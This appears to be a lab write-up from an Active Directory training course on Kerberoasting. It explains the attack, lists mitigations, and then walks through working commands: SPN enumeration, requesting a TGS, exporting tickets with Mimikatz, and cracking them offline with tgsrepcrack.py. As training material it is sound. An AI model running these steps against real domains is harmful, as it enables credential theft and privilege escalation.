# Privilege Escalation - Kerberoasting

Kerberoasting is a technique used in post-exploitation scenarios to crack service account credentials by brute-forcing the Kerberos Ticket-Granting Service (TGS) ticket. The attack targets the **Service Principal Name (SPN)** associated with service accounts in a domain. Here's a breakdown of how the attack works, its impact, and measures to mitigate it.

## What is Kerberoasting?

Kerberoasting is a type of cyber-attack that exploits a vulnerability in the **Kerberos authentication protocol**, which is used in Microsoft Active Directory (AD) to authenticate users and services. In this attack, the attacker attempts to retrieve the hashed passwords of service accounts, which are typically weak or static, and then cracks them offline to obtain the plaintext password. Once the password is obtained, an attacker could gain unauthorized access to the service account and potentially compromise the entire network.

## How Does Kerberoasting Work?

1. **Identify Service Accounts**:
   Every user account with a non-null **Service Principal Name (SPN)** is a service account. This means that even if there is no service directly associated with the account, the presence of an SPN indicates that the account is a service account.

2. **Request a TGS Ticket**:
   Once a service account is identified, the attacker can request a **Ticket Granting Service (TGS)** ticket for that service from the Domain Controller (DC). The TGS ticket is encrypted using the service account’s password hash.

3. **Offline Brute-Force Attack**:
   After obtaining the TGS ticket, the attacker can extract the password hash and attempt to crack it offline using brute-force techniques. Since this does not involve interacting directly with the service or domain controller during the cracking process, the attack is stealthy and can be performed at the attacker’s convenience.

4. **Crack the Password**:
   If successful, the attacker recovers the plaintext password of the service account, which can then be used to access services or escalate privileges.

## Why is Kerberoasting Effective?

- **No Domain Admin Rights Required**:
  The attacker does not need domain administrator credentials to perform Kerberoasting. They only need to be able to request tickets for service accounts, which is possible if they have basic user access in the domain.
  
- **Offline Cracking**:
  The attack is conducted offline, meaning the attacker can perform brute-force attacks at their own pace without generating significant network traffic or alerting the defenders in real time.
  
- **Weak Service Account Passwords**:
  Service accounts often have weak or static passwords, which are rarely changed. This makes them attractive targets for attackers, as cracking weak passwords is much easier.
  
- **Privilege Escalation**:
  Service accounts often have elevated privileges, meaning that cracking their password can lead to a significant compromise of the domain.

- **Potential for Silver Ticket Creation**:
  Once an attacker obtains the service account's password hash, they can use it to create **Silver Tickets**—Kerberos tickets that can be used to impersonate the service account and access resources.

## Mitigation Strategies

1. **Secure Service Accounts**:
   - Ensure that service account passwords are strong and changed regularly. 
   - Implement **Managed Service Accounts (MSA)** or **Group Managed Service Accounts (gMSA)**, which provide automatic password management, reducing the risk of weak or static passwords.
   
2. **Access Control**:
   - Limit who can request service tickets and access service accounts.
   - Regularly audit SPNs to ensure only authorized accounts are configured as service accounts.
   
3. **Monitor for Suspicious Activity**:
   - Monitor for excessive ticket requests or other anomalies that could indicate Kerberoasting attempts.
   - Implement **Kerberos logging** on Domain Controllers to capture suspicious ticket requests.

4. **Service Account Management**:
   - Ensure that service accounts are properly managed and isolated, with minimal privileges granted only as needed.
   - Regularly review and rotate service account credentials as part of your organization's security policy.

## Conclusion

Kerberoasting is a powerful attack technique because it allows attackers to extract service account password hashes and crack them offline. Since the attack does not require administrative privileges and takes advantage of weak or stale service account passwords, it poses a significant risk to Active Directory environments. Implementing strong service account management practices, password policies, and monitoring can significantly reduce the risk of a successful Kerberoasting attack.

![image](https://github.com/user-attachments/assets/969c0eb3-ca3d-4673-9ca8-4de68fabf0fb)

# Finding Services Running with User Accounts

We first need to find out services running with user accounts, as services running with machine accounts have difficult passwords. We can use Power View's `Get-NetUser –SPN` or Active Directory module for discovering such services.

## Find User Accounts Used as Service Accounts
```powershell
PS C:\AD\Tools> Get-NetUser -SPN
PS C:\AD\Tools> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

Neat! The `svcadmin`, which is a domain administrator, has a SPN set! Let’s request a ticket for the service.

## Request a TGS
```powershell
PS C:\AD\Tools> Add-Type -AssemblyName System.IdentityModel
PS C:\AD\Tools> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```

## Check if We Have the TGS for the Service
```powershell
PS C:\AD\Tools> klist

#2>     Client: student157 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
```

## Dump the Tickets to Disk
```powershell
PS C:\AD\Tools> . .\Invoke-Mimikatz.ps1
PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::list /export"'
```

## Copy the MSSQL Ticket to the Kerberoast Folder and Offline Crack the Service Account Password
```powershell
PS C:\AD\Tools> Copy-Item .\1-40a10000-studentx@MSSQLSvc~dcorpmgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi C:\AD\Tools\kerberoast\
PS C:\AD\Tools> cd kerberoast

PS C:\AD\Tools\kerberoast> python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student157@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```
